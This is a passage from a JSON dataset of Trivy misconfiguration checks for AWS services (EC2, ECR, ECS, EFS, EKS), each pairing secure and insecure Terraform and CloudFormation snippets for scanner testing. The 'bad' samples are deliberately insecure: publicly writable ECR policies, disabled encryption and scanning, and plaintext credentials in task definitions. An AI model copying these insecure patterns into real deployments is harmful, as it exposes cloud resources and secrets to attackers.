        "yaml_content": "terraform:\n  good:\n    - |-\n      data \"aws_ami\" \"example\" {\n        most_recent = true\n        owners      = [\"099720109477\"] # Canonical\n        filter {\n          name   = \"name\"\n          values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n        }\n      }\n  bad:\n    - |-\n      data \"aws_ami\" \"example\" {\n        most_recent = true\n        filter {\n          name   = \"name\"\n          values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n        }\n      }\n",
        "file_name": "specify_ami_owners.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/specify_ami_owners.yaml",
        "local_path": "aws/ec2/specify_ami_owners.yaml",
        "parsed_metadata": {
          "terraform": {
            "good": [
              "data \"aws_ami\" \"example\" {\n  most_recent = true\n  owners      = [\"099720109477\"] # Canonical\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n  }\n}"
            ],
            "bad": [
              "data \"aws_ami\" \"example\" {\n  most_recent = true\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-ENABLE_IMAGE_SCANS",
        "title": "Enable Image Scans",
        "provider": "aws",
        "service": "ecr",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            ImageScanningConfiguration:\n              ScanOnPush: true\n            RepositoryName: test-repository\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            ImageScanningConfiguration:\n              ScanOnPush: false\n            RepositoryName: test-repository\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration\n  good:\n    - |-\n      resource \"aws_ecr_repository\" \"good_example\" {\n        name = \"bar\"\n        image_scanning_configuration {\n          scan_on_push = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name = \"bar\"\n        image_scanning_configuration {\n          scan_on_push = false\n        }\n      }\n",
        "file_name": "enable_image_scans.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/enable_image_scans.yaml",
        "local_path": "aws/ecr/enable_image_scans.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      ImageScanningConfiguration:\n        ScanOnPush: true\n      RepositoryName: test-repository"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      ImageScanningConfiguration:\n        ScanOnPush: false\n      RepositoryName: test-repository"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration"
            ],
            "good": [
              "resource \"aws_ecr_repository\" \"good_example\" {\n  name = \"bar\"\n  image_scanning_configuration {\n    scan_on_push = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name = \"bar\"\n  image_scanning_configuration {\n    scan_on_push = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-ENFORCE_IMMUTABLE_REPOSITORY",
        "title": "Enforce Immutable Repository",
        "provider": "aws",
        "service": "ecr",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            ImageTagMutability: IMMUTABLE\n            RepositoryName: test-repository\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository\n  good:\n    - |-\n      resource \"aws_ecr_repository\" \"good_example\" {\n        name                 = \"bar\"\n        image_tag_mutability = \"IMMUTABLE\"\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name                 = \"bar\"\n        image_tag_mutability = \"MUTABLE\"\n      }\n",
        "file_name": "enforce_immutable_repository.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/enforce_immutable_repository.yaml",
        "local_path": "aws/ecr/enforce_immutable_repository.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      ImageTagMutability: IMMUTABLE\n      RepositoryName: test-repository"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository"
            ],
            "good": [
              "resource \"aws_ecr_repository\" \"good_example\" {\n  name                 = \"bar\"\n  image_tag_mutability = \"IMMUTABLE\"\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name                 = \"bar\"\n  image_tag_mutability = \"MUTABLE\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "aws",
        "service": "ecr",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\n            RepositoryPolicyText:\n              Statement:\n                - Action:\n                    - ecr:PutImage\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - arn:aws:iam::123456789012:user/Alice\n                  Sid: AllowPushPull\n              Version: \"2012-10-17\"\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\n            RepositoryPolicyText:\n              Statement:\n                - Action:\n                    - ecr:PutImage\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - '*'\n                  Sid: AllowPushPull\n              Version: \"2012-10-17\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository_policy#policy\n  good:\n    - |-\n      resource \"aws_ecr_repository\" \"example\" {\n        name = \"bar\"\n      }\n\n      resource \"aws_ecr_repository_policy\" \"example\" {\n        repository = aws_ecr_repository.example.name\n        policy     = <<EOF\n       {\n           \"Version\": \"2008-10-17\",\n           \"Statement\": [\n               {\n                   \"Sid\": \"new policy\",\n                   \"Effect\": \"Allow\",\n                   \"Principal\": \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\",\n                   \"Action\": [\n                       \"ecr:SetRepositoryPolicy\"\n                   ]\n               }\n           ]\n       }\n       EOF\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"example\" {\n        name = \"bar\"\n      }\n\n      resource \"aws_ecr_repository_policy\" \"example\" {\n        repository = aws_ecr_repository.example.name\n\n        policy = <<EOF\n       {\n           \"Version\": \"2008-10-17\",\n           \"Statement\": [\n               {\n                   \"Sid\": \"new policy\",\n                   \"Effect\": \"Allow\",\n                   \"Principal\": \"*\",\n                   \"Action\": [\n                       \"ecr:SetRepositoryPolicy\"\n                   ]\n               }\n           ]\n       }\n       EOF\n      }\n    - |-\n      resource \"aws_ecr_repository\" \"example\" {\n        name = \"bar\"\n      }\n\n      data \"aws_iam_policy_document\" \"example\" {\n        version = \"2008-10-17\"\n        statement {\n          sid    = \"new policy\"\n          effect = \"Allow\"\n          principals {\n            type        = \"*\"\n            identifiers = [\"*\"]\n          }\n          actions = [\n            \"ecr:SetRepositoryPolicy\"\n          ]\n        }\n      }\n\n      resource \"aws_ecr_repository_policy\" \"example\" {\n        repository = aws_ecr_repository.example.name\n        policy     = data.aws_iam_policy_document.example.json\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/no_public_access.yaml",
        "local_path": "aws/ecr/no_public_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository\n      RepositoryPolicyText:\n        Statement:\n          - Action:\n              - ecr:PutImage\n            Effect: Allow\n            Principal:\n              AWS:\n                - arn:aws:iam::123456789012:user/Alice\n            Sid: AllowPushPull\n        Version: \"2012-10-17\""
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository\n      RepositoryPolicyText:\n        Statement:\n          - Action:\n              - ecr:PutImage\n            Effect: Allow\n            Principal:\n              AWS:\n                - '*'\n            Sid: AllowPushPull\n        Version: \"2012-10-17\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository_policy#policy"
            ],
            "good": [
              "resource \"aws_ecr_repository\" \"example\" {\n  name = \"bar\"\n}\n\nresource \"aws_ecr_repository_policy\" \"example\" {\n  repository = aws_ecr_repository.example.name\n  policy     = <<EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\",\n             \"Action\": [\n                 \"ecr:SetRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"example\" {\n  name = \"bar\"\n}\n\nresource \"aws_ecr_repository_policy\" \"example\" {\n  repository = aws_ecr_repository.example.name\n\n  policy = <<EOF\n {\n     \"Version\": \"2008-10-17\",\n     \"Statement\": [\n         {\n             \"Sid\": \"new policy\",\n             \"Effect\": \"Allow\",\n             \"Principal\": \"*\",\n             \"Action\": [\n                 \"ecr:SetRepositoryPolicy\"\n             ]\n         }\n     ]\n }\n EOF\n}",
              "resource \"aws_ecr_repository\" \"example\" {\n  name = \"bar\"\n}\n\ndata \"aws_iam_policy_document\" \"example\" {\n  version = \"2008-10-17\"\n  statement {\n    sid    = \"new policy\"\n    effect = \"Allow\"\n    principals {\n      type        = \"*\"\n      identifiers = [\"*\"]\n    }\n    actions = [\n      \"ecr:SetRepositoryPolicy\"\n    ]\n  }\n}\n\nresource \"aws_ecr_repository_policy\" \"example\" {\n  repository = aws_ecr_repository.example.name\n  policy     = data.aws_iam_policy_document.example.json\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-REPOSITORY_CUSTOMER_KEY",
        "title": "Repository Customer Key",
        "provider": "aws",
        "service": "ecr",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ecr-repository.html#cfn-ecr-repository-encryptionconfiguration\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            EncryptionConfiguration:\n              EncryptionType: KMS\n              KmsKey: alias/ecr-key\n            RepositoryName: test-repository\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#encryption_configuration\n  good:\n    - |-\n      resource \"aws_kms_key\" \"ecr_kms\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_ecr_repository\" \"good_example\" {\n        name = \"bar\"\n        encryption_configuration {\n          encryption_type = \"KMS\"\n          kms_key         = aws_kms_key.ecr_kms.key_id\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name = \"bar\"\n      }\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name = \"bar\"\n        encryption_configuration {\n          encryption_type = \"KMS\"\n        }\n      }\n",
        "file_name": "repository_customer_key.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/repository_customer_key.yaml",
        "local_path": "aws/ecr/repository_customer_key.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ecr-repository.html#cfn-ecr-repository-encryptionconfiguration"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      EncryptionConfiguration:\n        EncryptionType: KMS\n        KmsKey: alias/ecr-key\n      RepositoryName: test-repository"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#encryption_configuration"
            ],
            "good": [
              "resource \"aws_kms_key\" \"ecr_kms\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_ecr_repository\" \"good_example\" {\n  name = \"bar\"\n  encryption_configuration {\n    encryption_type = \"KMS\"\n    kms_key         = aws_kms_key.ecr_kms.key_id\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name = \"bar\"\n}",
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name = \"bar\"\n  encryption_configuration {\n    encryption_type = \"KMS\"\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECS-ENABLE_CONTAINER_INSIGHT",
        "title": "Enable Container Insight",
        "provider": "aws",
        "service": "ecs",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECS::Cluster\n          Properties:\n            ClusterName: MyCluster\n            ClusterSettings:\n              - Name: containerInsights\n                Value: enabled\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECS::Cluster\n          Properties:\n            ClusterName: MyCluster\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_cluster#setting\n  good:\n    - |-\n      resource \"aws_ecs_cluster\" \"good_example\" {\n        name = \"services-cluster\"\n\n        setting {\n          name  = \"containerInsights\"\n          value = \"enabled\"\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecs_cluster\" \"bad_example\" {\n        name = \"services-cluster\"\n      }\n",
        "file_name": "enable_container_insight.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecs/enable_container_insight.yaml",
        "local_path": "aws/ecs/enable_container_insight.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECS::Cluster\n    Properties:\n      ClusterName: MyCluster\n      ClusterSettings:\n        - Name: containerInsights\n          Value: enabled"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECS::Cluster\n    Properties:\n      ClusterName: MyCluster"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_cluster#setting"
            ],
            "good": [
              "resource \"aws_ecs_cluster\" \"good_example\" {\n  name = \"services-cluster\"\n\n  setting {\n    name  = \"containerInsights\"\n    value = \"enabled\"\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecs_cluster\" \"bad_example\" {\n  name = \"services-cluster\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECS-ENABLE_IN_TRANSIT_ENCRYPTION",
        "title": "Enable In Transit Encryption",
        "provider": "aws",
        "service": "ecs",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Image: amazon/amazon-ecs-sample\n            Volumes:\n              - EFSVolumeConfiguration:\n                  FilesystemId: fs1\n                  TransitEncryption: ENABLED\n                Name: jenkins-home\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Image: amazon/amazon-ecs-sample\n            Volumes:\n              - EFSVolumeConfiguration:\n                  FilesystemId: fs1\n                  TransitEncryption: DISABLED\n                Name: jenkins-home\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition#transit_encryption\n  good:\n    - |-\n      resource \"aws_ecs_task_definition\" \"good_example\" {\n        container_definitions = file(\"task-definitions/service.json\")\n        volume {\n          name = \"service-storage\"\n          efs_volume_configuration {\n            file_system_id     = aws_efs_file_system.fs.id\n            transit_encryption = \"ENABLED\"\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecs_task_definition\" \"bad_example\" {\n        container_definitions = file(\"task-definitions/service.json\")\n        volume {\n          name = \"service-storage\"\n          efs_volume_configuration {\n            file_system_id = aws_efs_file_system.fs.id\n            root_directory = \"/opt/data\"\n          }\n        }\n      }\n",
        "file_name": "enable_in_transit_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecs/enable_in_transit_encryption.yaml",
        "local_path": "aws/ecs/enable_in_transit_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Image: amazon/amazon-ecs-sample\n      Volumes:\n        - EFSVolumeConfiguration:\n            FilesystemId: fs1\n            TransitEncryption: ENABLED\n          Name: jenkins-home"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Image: amazon/amazon-ecs-sample\n      Volumes:\n        - EFSVolumeConfiguration:\n            FilesystemId: fs1\n            TransitEncryption: DISABLED\n          Name: jenkins-home"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition#transit_encryption"
            ],
            "good": [
              "resource \"aws_ecs_task_definition\" \"good_example\" {\n  container_definitions = file(\"task-definitions/service.json\")\n  volume {\n    name = \"service-storage\"\n    efs_volume_configuration {\n      file_system_id     = aws_efs_file_system.fs.id\n      transit_encryption = \"ENABLED\"\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecs_task_definition\" \"bad_example\" {\n  container_definitions = file(\"task-definitions/service.json\")\n  volume {\n    name = \"service-storage\"\n    efs_volume_configuration {\n      file_system_id = aws_efs_file_system.fs.id\n      root_directory = \"/opt/data\"\n    }\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECS-NO_PLAINTEXT_SECRETS",
        "title": "No Plaintext Secrets",
        "provider": "aws",
        "service": "ecs",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Image: amazon/amazon-ecs-sample\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECS::TaskDefinition\n          Properties:\n            ContainerDefinitions:\n              - Environment:\n                  - Name: AWS_ACCESS_KEY_ID\n                    Value: AIPA8YOHGIS58IBFDU3E\n                Image: amazon/amazon-ecs-sample\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition\n  good:\n    - |-\n      resource \"aws_ecs_task_definition\" \"good_example\" {\n        container_definitions = <<EOF\n       [\n         {\n           \"name\": \"my_service\",\n           \"environment\": [\n             { \"name\": \"ENVIRONMENT\", \"value\": \"development\" }\n           ]\n         }\n       ]\n       EOF\n      }\n  bad:\n    - |-\n      resource \"aws_ecs_task_definition\" \"bad_example\" {\n        container_definitions = <<EOF\n       [\n         {\n           \"name\": \"my_service\",\n           \"environment\": [\n             { \"name\": \"ENVIRONMENT\", \"value\": \"development\" },\n             { \"name\": \"DATABASE_PASSWORD\", \"value\": \"oh no D:\"}\n           ]\n         }\n       ]\n       EOF\n      }\n",
        "file_name": "no_plaintext_secrets.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecs/no_plaintext_secrets.yaml",
        "local_path": "aws/ecs/no_plaintext_secrets.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Image: amazon/amazon-ecs-sample"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECS::TaskDefinition\n    Properties:\n      ContainerDefinitions:\n        - Environment:\n            - Name: AWS_ACCESS_KEY_ID\n              Value: AIPA8YOHGIS58IBFDU3E\n          Image: amazon/amazon-ecs-sample"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecs_task_definition"
            ],
            "good": [
              "resource \"aws_ecs_task_definition\" \"good_example\" {\n  container_definitions = <<EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" }\n     ]\n   }\n ]\n EOF\n}"
            ],
            "bad": [
              "resource \"aws_ecs_task_definition\" \"bad_example\" {\n  container_definitions = <<EOF\n [\n   {\n     \"name\": \"my_service\",\n     \"environment\": [\n       { \"name\": \"ENVIRONMENT\", \"value\": \"development\" },\n       { \"name\": \"DATABASE_PASSWORD\", \"value\": \"oh no D:\"}\n     ]\n   }\n ]\n EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EFS-ENABLE_AT_REST_ENCRYPTION",
        "title": "Enable At Rest Encryption",
        "provider": "aws",
        "service": "efs",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html#cfn-efs-filesystem-encrypted\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EFS::FileSystem\n          Properties:\n            Encrypted: true\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EFS::FileSystem\n          Properties:\n            Encrypted: false\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system\n  good:\n    - |-\n      resource \"aws_efs_file_system\" \"good_example\" {\n        name      = \"bar\"\n        encrypted = true\n      }\n  bad:\n    - |-\n      resource \"aws_efs_file_system\" \"bad_example\" {\n        name      = \"bar\"\n        encrypted = false\n      }\n",
        "file_name": "enable_at_rest_encryption.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/efs/enable_at_rest_encryption.yaml",
        "local_path": "aws/efs/enable_at_rest_encryption.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-efs-filesystem.html#cfn-efs-filesystem-encrypted"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: true"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EFS::FileSystem\n    Properties:\n      Encrypted: false"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/efs_file_system"
            ],
            "good": [
              "resource \"aws_efs_file_system\" \"good_example\" {\n  name      = \"bar\"\n  encrypted = true\n}"
            ],
            "bad": [
              "resource \"aws_efs_file_system\" \"bad_example\" {\n  name      = \"bar\"\n  encrypted = false\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-ENABLE_CONTROL_PLANE_LOGGING",
        "title": "Enable Control Plane Logging",
        "provider": "aws",
        "service": "eks",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-eks-cluster.html#cfn-eks-cluster-logging\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EKS::Cluster\n          Properties:\n            Logging:\n              ClusterLogging:\n                EnabledTypes:\n                  - Type: api\n                  - Type: audit\n                  - Type: authenticator\n                  - Type: controllerManager\n                  - Type: scheduler\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EKS::Cluster\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#enabled_cluster_log_types\n  good:\n    - |-\n      resource \"aws_eks_cluster\" \"good_example\" {\n        enabled_cluster_log_types = [\"api\", \"authenticator\", \"audit\", \"scheduler\", \"controllerManager\"]\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {}\n",
        "file_name": "enable_control_plane_logging.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/enable_control_plane_logging.yaml",
        "local_path": "aws/eks/enable_control_plane_logging.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-eks-cluster.html#cfn-eks-cluster-logging"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EKS::Cluster\n    Properties:\n      Logging:\n        ClusterLogging:\n          EnabledTypes:\n            - Type: api\n            - Type: audit\n            - Type: authenticator\n            - Type: controllerManager\n            - Type: scheduler"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EKS::Cluster"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#enabled_cluster_log_types"
            ],
            "good": [
              "resource \"aws_eks_cluster\" \"good_example\" {\n  enabled_cluster_log_types = [\"api\", \"authenticator\", \"audit\", \"scheduler\", \"controllerManager\"]\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-ENCRYPT_SECRETS",
        "title": "Encrypt Secrets",
        "provider": "aws",
        "service": "eks",
        "language": "cloudformation",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EKS::Cluster\n          Properties:\n            EncryptionConfig:\n              - Provider:\n                  KeyArn: alias/eks-kms\n                Resources:\n                  - secrets\n            Name: goodExample\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EKS::Cluster\n          Properties:\n            Name: badExample\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#encryption_config\n  good:\n    - |-\n      resource \"aws_kms_key\" \"eks\" {\n        enable_key_rotation = true\n      }\n\n      resource \"aws_eks_cluster\" \"good_example\" {\n        encryption_config {\n          resources = [\"secrets\"]\n          provider {\n            key_arn = aws_kms_key.eks.arn\n          }\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n      }\n    - |-\n      resource \"aws_eks_cluster\" \"bad_example\" {\n        name = \"bad_example_cluster\"\n        encryption_config {\n          resources = [\"secrets\"]\n        }\n      }\n",
        "file_name": "encrypt_secrets.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/eks/encrypt_secrets.yaml",
        "local_path": "aws/eks/encrypt_secrets.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EKS::Cluster\n    Properties:\n      EncryptionConfig:\n        - Provider:\n            KeyArn: alias/eks-kms\n          Resources:\n            - secrets\n      Name: goodExample"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EKS::Cluster\n    Properties:\n      Name: badExample"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/eks_cluster#encryption_config"
            ],
            "good": [
              "resource \"aws_kms_key\" \"eks\" {\n  enable_key_rotation = true\n}\n\nresource \"aws_eks_cluster\" \"good_example\" {\n  encryption_config {\n    resources = [\"secrets\"]\n    provider {\n      key_arn = aws_kms_key.eks.arn\n    }\n  }\n}"
            ],
            "bad": [
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n}",
              "resource \"aws_eks_cluster\" \"bad_example\" {\n  name = \"bad_example_cluster\"\n  encryption_config {\n    resources = [\"secrets\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EKS-NO_PUBLIC_CLUSTER_ACCESS",
        "title": "No Public Cluster Access",
        "provider": "aws",
        "service": "eks",
        "language": "cloudformation",
